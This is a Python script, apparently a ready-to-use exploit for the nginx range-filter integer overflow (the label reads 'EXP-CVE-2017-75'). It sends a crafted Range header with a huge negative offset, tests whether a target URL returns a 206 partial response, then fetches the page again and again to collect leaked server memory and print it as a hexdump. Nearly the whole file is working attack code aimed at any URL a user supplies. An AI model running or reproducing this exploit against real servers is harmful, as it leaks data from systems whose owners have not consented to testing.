import urllib.parse
import requests
import argparse

class Exploit(requests.Session):
    buffer = set()

    def __init__(self, url):
        print("[DEBUG] Initializing Exploit class.")
        length = int(requests.get(url).headers.get("Content-Length", 0)) + 623
        super().__init__()
        self.headers = {
            "Range": f"bytes=-{length},-9223372036854{776000 - length}",
        }
        print(f"[DEBUG] Request headers set: {self.headers}")
        self.target = urllib.parse.urlsplit(url)
        print(f"[DEBUG] Target URL split into components: {self.target}")

    def check(self):
        print("[DEBUG] Checking if the target is vulnerable.")
        try:
            response = self.get(self.target.geturl())
            print(f"[DEBUG] Received HTTP status code: {response.status_code}")
            return response.status_code == 206 and "Content-Range" in response.text
        except Exception as e:
            print(f"[DEBUG] Exception during check: {e}")
            return False

    def hexdump(self, data):
        print("[DEBUG] Starting hexdump of received data.")
        for b in range(0, len(data), 16):
            line = [char for char in data[b: b + 16]]
            hex_chars = " ".join(f"{char:02x}" for char in line)
            text_chars = "".join((chr(char) if 32 <= char <= 126 else ".") for char in line)
            print(f" -  {b:04x}: {hex_chars:48} {text_chars}")

    def execute(self):
        print("[DEBUG] Executing exploit.")
        vulnerable = self.check()
        status = "+" if vulnerable else "-"
        print(f"[{status}] {self.target.netloc} is Vulnerable: {str(vulnerable).upper()}")
        if vulnerable:
            data = b""
            while len(self.buffer) < 0x80:
                try:
                    response = self.get(self.target.geturl())
                    for line in response.content.split(b"\r\n"):
                        if line not in self.buffer:
                            data += line
                            self.buffer.add(line)
                except Exception as e:
                    print(f"[DEBUG] Exception during data reception: {type(e).__name__}: {e}")
                    break
                except KeyboardInterrupt:
                    print("[DEBUG] Keyboard Interrupt detected.")
                    break
            if data:
                print("\n[DEBUG] Data reception complete, starting hexdump.")
                self.hexdump(data)
            else:
                print("[DEBUG] No data received.")
        else:
            print("[DEBUG] Target is not vulnerable, exploit not executed.")

if __name__ == "__main__":
    print("[DEBUG] Starting main execution of the script.")
    parser = argparse.ArgumentParser(prog="NGINX Overflow",
                                     description="EXP-CVE-2017-75",
                                     epilog="CalebFin")
    parser.add_argument("url", type=str, help="Target URL.")
    parser.add_argument("-c", "--check", action="store_true", help="Only check if Target is vulnerable.")
    args = parser.parse_args()
    print(f"[DEBUG] Arguments parsed: URL = {args.url}, Check Flag = {args.check}")

    try:
        exploit = Exploit(args.url)
        if args.check:
            print("[DEBUG] Check flag provided, proceeding with vulnerability check.")
            vulnerable = exploit.check()
            status = "+" if vulnerable else "-"
            print(f"[{status}] {exploit.target.netloc} is Vulnerable: {str(vulnerable).upper()}")
        else:
            print("[DEBUG] No check flag provided, attempting to execute exploit.")
            exploit.execute()
    except KeyboardInterrupt:
        print("[!] Keyboard Interrupted! (Ctrl+C Pressed)")
    except Exception as e:
        print(f"[!] Exception at script top level: {type(e).__name__}: {e}")
    print("[DEBUG] Script execution finished.")
